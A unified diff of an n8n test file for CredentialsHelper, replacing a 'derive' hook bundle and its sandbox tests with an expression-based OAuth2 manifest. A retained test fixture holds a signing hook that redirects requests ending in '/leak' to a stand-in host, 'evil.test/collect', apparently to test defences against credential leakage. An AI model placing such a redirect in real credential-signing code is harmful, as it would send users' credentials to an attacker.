@@ -1,5 +1,4 @@
 import type { LicenseState } from '@n8n/backend-common';
-import { mockInstance } from '@n8n/backend-test-utils';
 import { GlobalConfig } from '@n8n/config';
 import {
 	CredentialsEntity,
@@ -27,8 +26,6 @@ import type {
 } from 'n8n-workflow';
 import { hostRuntime } from '@n8n/node-sdk/host';
 import { addToStore, manifestTextOf, type CredentialManifest } from '@n8n/node-sdk/registry';
-import { workerRuntime } from '@n8n/node-sdk/runtimes';
-import { policyCredentialTypeLoader } from '@n8n/node-sdk/sandbox';
 import { OAuth2Api } from 'n8n-nodes-base/credentials/OAuth2Api.credentials';
 import { deepCopy, jsonParse, Workflow } from 'n8n-workflow';
 import { createHash, generateKeyPairSync } from 'node:crypto';
@@ -57,7 +54,7 @@ import { CredentialNotFoundError } from '@/errors/credential-not-found.error';
 import type { LoadNodesAndCredentials } from '@/load-nodes-and-credentials';
 import { MissingExecutionContextError } from '@/modules/dynamic-credentials.ee/errors/missing-execution-context.error';
 import type { ExternalSecretsConfig } from '@/modules/external-secrets.ee/external-secrets.config';
-import { ContractNodeLoader, NodeContractsStore } from '@/node-contracts-registry';
+import { ContractNodeLoader } from '@/node-contracts-registry';
 import type { PolicyEnforcementService } from '@/policy/policy-enforcement.service';
 import type { AiGatewayService } from '@/services/ai-gateway.service';
 
@@ -3399,17 +3396,7 @@ describe('CredentialsHelper', () => {
 	});
 
 	describe('credential types with code of a contract package', () => {
-		// Bundles as `packCredential` writes them: the default export is the credential type.
-		const derivingBundle = `module.exports = { default: { derive: (fields) => {
-	if ('clientSecret' in fields) throw new Error('derive got a secret');
-	const origin = new URL(fields.server).origin;
-	return {
-		authorizationEndpoint: origin + '/login/oauth/authorize',
-		tokenEndpoint: origin + '/login/oauth/access_token',
-		scope: ['repo', 'user'].join(','),
-		authorizationQuery: { allow_signup: 'false' },
-	};
-} } };`;
+		// A bundle as `packCredential` writes it: the default export is the credential type.
 		const signingBundle = `module.exports = { default: { scheme: { sign: async (fields, request) => ({
 	...request,
 	url: request.url.endsWith('/leak') ? 'https://evil.test/collect' : request.url,
@@ -3426,38 +3413,38 @@ describe('CredentialsHelper', () => {
 			bundleHash: sha256(bundle),
 			...manifest,
 		});
-		const deriving = manifestOf(
-			{
-				id: 'acme.oauth2',
-				name: 'acmeOAuth2Api',
-				displayName: 'Acme OAuth2 API',
-				fields: {
-					type: 'object',
-					properties: {
-						server: {
-							type: 'string',
-							title: 'Server',
-							format: 'uri',
-							default: 'https://api.acme.test',
-						},
-						clientSecret: { type: 'string', title: 'Client Secret', writeOnly: true },
+		const expressive: CredentialManifest = {
+			kind: 'credential',
+			semver: '1.0.0',
+			nodeContract: '2.13.0',
+			id: 'acme.oauth2',
+			name: 'acmeOAuth2Api',
+			displayName: 'Acme OAuth2 API',
+			fields: {
+				type: 'object',
+				properties: {
+					server: {
+						type: 'string',
+						title: 'Server',
+						format: 'uri',
+						default: 'https://api.acme.test',
 					},
-					required: ['clientSecret'],
 				},
-				scheme: {
-					kind: 'oauth2',
-					grant: 'authorizationCode',
-					authorizationEndpoint: 'https://acme.test/authorize',
-					tokenEndpoint: 'https://acme.test/token',
-					scope: [],
-					clientAuth: 'client_secret_basic',
-					pkce: true,
-					authorizationQuery: {},
-				},
-				hooks: ['derive'],
 			},
-			derivingBundle,
-		);
+			scheme: {
+				kind: 'oauth2',
+				grant: 'authorizationCode',
+				authorizationEndpoint:
+					'={{ $credentials.server.replace(/\\/api\\/v3$/, "") }}/login/oauth/authorize',
+				tokenEndpoint:
+					'={{ $credentials.server.replace(/\\/api\\/v3$/, "") }}/login/oauth/access_token',
+				scope: ['repo', 'user'],
+				scopeSeparator: ',',
+				clientAuth: 'client_secret_basic',
+				pkce: false,
+				authorizationQuery: {},
+			},
+		};
 		const signing = manifestOf(
 			{
 				id: 'acme.signed',
@@ -3479,7 +3466,7 @@ describe('CredentialsHelper', () => {
 		beforeAll(async () => {
 			state.dir = await mkdtemp(path.join(tmpdir(), 'credential-bundles-'));
 			await addToStore(path.join(state.dir, 'dist', 'store'), [
-				{ manifestText: manifestTextOf(deriving), bundle: derivingBundle },
+				{ manifestText: manifestTextOf(expressive) },
 				{ manifestText: manifestTextOf(signing), bundle: signingBundle },
 			]);
 		});
@@ -3553,7 +3540,7 @@ describe('CredentialsHelper', () => {
 			);
 		};
 
-		test('getDecrypted gives the OAuth2 data that derive gives from the fields without secrets', async () => {
+		test('getDecrypted resolves the OAuth2 endpoints of a type from its expressions', async () => {
 			const data = await decrypted(await helperWith());
 
 			expect(data).toMatchObject({
@@ -3562,61 +3549,6 @@ describe('CredentialsHelper', () => {
 				authUrl: 'https://ghe.acme.test/login/oauth/authorize',
 				accessTokenUrl: 'https://ghe.acme.test/login/oauth/access_token',
 				scope: 'repo,user',
-				authQueryParameters: 'allow_signup=false',
-			});
-		});
-
-		test('getDecrypted runs the derive of a stored community credential type in a worker', async () => {
-			mockInstance(NodeContractsStore, { dir: path.join(state.dir, 'instance') });
-			const log = vi.fn();
-			const policy = {
-				lists: {
-					'first-party': ['in-process' as const],
-					community: ['wasm' as const, 'container' as const],
-					private: ['wasm' as const, 'container' as const],
-				},
-				available: { missing: {} },
-				runtimes: { worker: () => workerRuntime() },
-				log,
-			};
-			const contracts = new ContractNodeLoader(
-				hostRuntime({
-					credentialTypeLoader: policyCredentialTypeLoader(policy, {
-						cacheDir: path.join(state.dir, 'sandbox'),
-					}),
-				}),
-				[],
-				[],
-				async () => ({
-					versions: async () => new Map(),
-					credentials: async () => new Map([[deriving.name, deriving]]),
-					credentialCodeOf: async () => ({ origin: 'community' as const, bundle: derivingBundle }),
-				}),
-				[],
-				() => false,
-				() => ({}),
-			);
-
-			const data = await decrypted(await helperWith({}, contracts));
-
-			expect(log).toHaveBeenCalledWith('acme.oauth2@1.0.0 (community credential) runs in worker');
-			expect(data).toMatchObject({
-				clientSecret: 'secret-1',
-				authUrl: 'https://ghe.acme.test/login/oauth/authorize',
-				accessTokenUrl: 'https://ghe.acme.test/login/oauth/access_token',
-				scope: 'repo,user',
-				authQueryParameters: 'allow_signup=false',
-			});
-		});
-
-		test('getDecrypted keeps an admin overwrite over what derive gives', async () => {
-			const data = await decrypted(
-				await helperWith({ accessTokenUrl: 'https://login.acme.test/token' }),
-			);
-
-			expect(data).toMatchObject({
-				authUrl: 'https://ghe.acme.test/login/oauth/authorize',
-				accessTokenUrl: 'https://login.acme.test/token',
 			});
 		});
 
